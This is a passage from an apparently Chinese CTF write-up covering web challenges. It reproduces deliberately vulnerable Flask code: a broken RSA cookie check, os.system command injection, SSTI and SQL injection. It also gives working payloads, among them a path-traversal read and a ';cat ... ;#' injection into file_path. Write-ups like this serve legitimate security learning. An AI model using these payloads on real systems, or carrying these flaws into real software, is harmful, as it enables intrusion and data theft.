class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg_str, sig_hex = cookie.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    msg_dict = json.loads(msg_str)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = <span class="built_in">bytes</span>.fromhex(sig_hex)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg_dict = &#123;<span class="string">&quot;user_name&quot;</span>: user.name, <span class="string">&quot;login_time&quot;</span>: <span class="built_in">int</span>(time.time())&#125;</span><br><span class="line">    msg_str = json.dumps(msg_dict)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)</span><br><span class="line">    sig_hex = sig.<span class="built_in">hex</span>()</span><br><span class="line">    packed = msg_str + <span class="string">&quot;&amp;&quot;</span> + sig_hex</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(packed.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;&#x27;_#&amp;;&quot;</span>:</span><br><span class="line">                    abort(<span class="number">403</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>这回使用了<code>RSA</code>，本以为会十分的棘手，结果赛后看了师傅们的<code>wp</code>才知道，这题都直接送分了。。。</p><p>注意关键函数<code>parse_cookie()</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">    valid = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题与1最大的不同就是使用了<strong>PKCS#1_v1.5签名算法</strong>，但是这里并不需要让<code>PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</code>返回<strong>True</strong>，只需要让它<strong>不抛出错误</strong>即可，所以这题可以<strong>直接改用户名</strong>为<code>admin</code>，它只是会签名认证不通过，但<code>valid = True</code>，从而用户认证通过</p><p>代码审的不够认真啊</p><h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>图片的内容就是文件<code>base64</code>编码之后的输出</p><p>可以看到是<code>Python</code>的服务，直接尝试读取<code>/upload?file_path=../../../app/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这里给了<code>admin</code>密码的<strong>哈希值</strong>，爆破一手，我用的<code>passwd-EN-Top10000</code>，得到密码为<code>backdoor</code></p><p>然后关注最后的条件判断，可以看到有<strong>命令执行</strong>，<code>file_path</code>我们是可控的，这里只有<strong>admin</strong>可以<strong>命令执行</strong>但不能读文件，而普通用户是可以<strong>直接读文件</strong>的</p><p>所以思路就是<strong>admin</strong>传参命令执行<strong>重定向</strong>，然后普通用户读</p><p><strong>admin: /upload?file_path=;cat /Fl4g_is_H3r3 &gt; ./uploads/flag;#</strong><br><strong>普通用户：/upload?file_path=flag</strong></p><h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site*"></a>Excellent-Site*</h2><blockquote><p>My site is PERFECT!!!<br>hosts: 0.0.0.0 ezmail.org</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib </span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;ezmail.org&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;ezmail.org&quot;</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>注意到<code>/admin</code>路由下是可以打<code>SSTI</code>的</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log*"></a>easy_log*</h2><blockquote><p>E@sy L0g</p></blockquote><figure class="highlight py"><table><tr><td 